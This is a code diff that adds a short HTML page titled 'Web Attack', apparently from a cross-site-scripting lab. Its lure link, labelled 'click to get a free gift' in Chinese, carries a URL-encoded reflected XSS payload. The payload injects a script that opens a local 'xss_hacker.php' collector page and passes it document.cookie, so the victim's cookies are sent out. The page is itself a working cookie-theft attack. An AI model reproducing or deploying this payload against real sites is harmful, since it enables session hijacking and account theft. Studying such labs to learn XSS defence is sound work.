@@ -1,0 +1,16 @@
+<html>
+    <head>
+        <title>Web Attack</title>
+        <meta charset="UTF-8">
+    </head>
+    <body>
+      <ul>
+        <li><a href="./xss_reflected.php">xss reflected</a></li>
+      </ul>
+      <div>
+          <img style="max-width: 300px;" src="http://image.tanwan.com/lycq/v3/img/bg3.jpg?v=1">
+          <a href="./xss_reflected.php?address1=%22%2F%3E+%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A81%2Fxss_hacker.php%3Fcookie%3D%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E%3C%21--">点击就送</a>
+      </div>
+
+    </body>
+</html>
